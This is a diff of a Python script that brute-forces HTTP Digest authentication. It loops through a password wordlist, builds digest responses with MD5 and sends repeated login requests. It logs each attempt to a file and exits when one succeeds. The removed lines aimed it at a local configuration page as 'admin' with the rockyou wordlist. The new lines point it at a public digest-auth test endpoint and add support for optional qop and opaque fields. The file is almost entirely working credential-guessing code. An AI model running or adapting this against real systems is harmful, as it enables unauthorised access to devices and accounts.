@@ -6,80 +6,108 @@ import secrets
 
 # proud of this one
 def md5(*args) -> str:
-    string = ':'.join(str(x) for x in args)
+    string = ":".join(str(x) for x in args)
     return hashlib.md5(string.encode()).hexdigest()
 
 
+regex = re.compile('([^" ]+)[:=] ?"?([^" ]+)"?')
+
+
 def log(request, password, counter):
-    print(f'\n\n Status {request.status_code} detected: used \"{password}\" and counter at {counter}')
-    # writes results to a file
-    with open('results.txt', 'a') as results:
-        results.write(f'Password: {password}\nCounter: {counter}\nStatus: {request.status_code}\n\n')
-        # only ends on a 2xx sucessful auth
+    print(
+        f'\n\n Status {request.status_code} detected: used "{password}" and counter at {counter}'
+    )
+    with open("results.txt", "a") as results:
+        results.write(
+            f"Password: {password}\nCounter: {counter}\nStatus: {request.status_code}\n\n"
+        )
     if 200 <= request.status_code < 300:
-        print('Exiting')
+        print("Exiting")
         exit()
 
 
-def hashes(user, realm, password, method, uri, nonce, nc, cnonce, qop) -> str:
+def hashes(user, realm, password, method, uri, nonce, nc, cnonce, qop, opaque) -> str:
     h1 = md5(user, realm, password)
     h2 = md5(method, uri)
-    response = md5(h1, nonce, nc, cnonce, qop, h2)
+    if qop:
+        response = md5(h1, nonce, nc, cnonce, qop, h2)
+    else:
+        response = md5(h1, nonce, h2)
+
     return response
 
 
-reg = re.compile('(\w+)[:=] ?"?(\w+)"?')
-
-
-def parse_authheaders(authheader) -> str:
-    authheaders_dict = dict(reg.findall(authheader))
-    nonce = authheaders_dict['nonce']
-    return nonce
+def parse_authheaders(authheader) -> tuple:
+    authheaders_dict = dict(regex.findall(authheader))
+    auth = {}
+    auth["nonce"] = authheaders_dict["nonce"]
+    try:
+        auth["opaque"] = authheaders_dict["opaque"]
+    except KeyError:
+        auth["opaque"] = None
+    return auth
 
 
 def main() -> None:
-    # manual progress tracking, I know
     total = 0
 
-    url = 'http://172.16.1.1/configure'
+    # url = 'http://172.16.1.1/configure'
     # url = 'https://jigsaw.w3.org/HTTP/Digest/'
+    url = "http://httpbin.org/digest-auth/auth/guest/guest"
+    user = "guest"
+    uri = "/digest-auth/auth/guest/guest"
+    # uri = '/HTTP/Digest/'
+    method = "HEAD"
+    filename = "num.txt"
+    encoding = ""
+    qop = None
+    realm = None
 
-    # customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
-    user = 'admin'
-    uri = '/configure'
-    method = 'HEAD'
-    qop = 'auth'
-    filename = 'rockyou_utf8.txt'
-    encoding = ''
-
-    get_encoding = lambda encoding : 'utf8' if encoding == '' else encoding
+    get_encoding = lambda encoding: "utf8" if encoding == "" else encoding
 
     with open(filename, encoding=get_encoding(encoding)) as file:
-        # passwords = [line.rstrip() for line in file]
         passwords = file.readlines()
     passwords = [password.rstrip() for password in passwords]
 
-    print(len(passwords), 'passwords loaded')
+    print(len(passwords), "passwords loaded")
 
     if total > len(passwords):
-        print('Total is greater then amount of passwords, please change')
+        print("Total is greater then amount of passwords, please change")
         exit()
-    print('starting at', total)
 
-    # get a new nonce to start the chain
-    # gets realm from header, has problems with '@' for some reason, have to look into that
+    # get nonce, realm, and qop
     request = requests.head(url)
-    realm_dict = dict(reg.findall(request.headers['www-authenticate']))
-    realm = realm_dict['realm']
-    print('realm is', realm)
-    nonce = parse_authheaders(request.headers['www-authenticate'])
+    header = dict(regex.findall(request.headers["www-authenticate"]))
+    realm = header["realm"]
+    try:
+        qop = header["qop"]
+    except KeyError:
+        pass
+
+    auth = parse_authheaders(request.headers["www-authenticate"])
 
     for i in range(total, len(passwords)):
-        cnonce = secrets.token_hex(8)
-        response = hashes(user, realm, passwords[i], method, uri, nonce, '00000001', cnonce, qop)
+        cnonce = secrets.token_hex(4)
+        response = hashes(
+            user,
+            realm,
+            passwords[i],
+            method,
+            uri,
+            auth["nonce"],
+            "00000001",
+            cnonce,
+            qop,
+            auth["opaque"],
+        )
         header = {
-            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}", qop={qop}, nc="00000001", cnonce="{cnonce}"'
+            "Authorization": f'Digest username="{user}", realm="{realm}", nonce="{auth["nonce"]}", uri="{uri}", algorithm=MD5, response="{response}"'
         }
+        if auth["opaque"] != None:
+            header["Authorization"] += f', opaque={auth["opaque"]}'
+        if qop != None:
+            header["Authorization"] += f', qop={qop}, nc=00000001, cnonce="{cnonce}"'
+
         request = requests.head(url, headers=header)
         # triggers on status codes other than 200 but i'd want to know about those, too
         if request.status_code != 401:
@@ -87,16 +115,14 @@ def main() -> None:
             # new nonces are only given on 401's, so we have to make another request for one
             request = requests.head(url)
 
-        nonce = parse_authheaders(request.headers['www-authenticate'])
-
+        # finally, parse headers for new nonce. This will 'KeyError' if done on a 200 request it has do be done after the check for that
+        auth = parse_authheaders(request.headers["www-authenticate"])
         # if i % 100 == 0:
         #     print(i, end=', ')
-        # print(request.request.headers)
         print(i, passwords[i], request.status_code)
-        # print(nonce)
 
-    print('La fin.')
+    print("La fin.")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
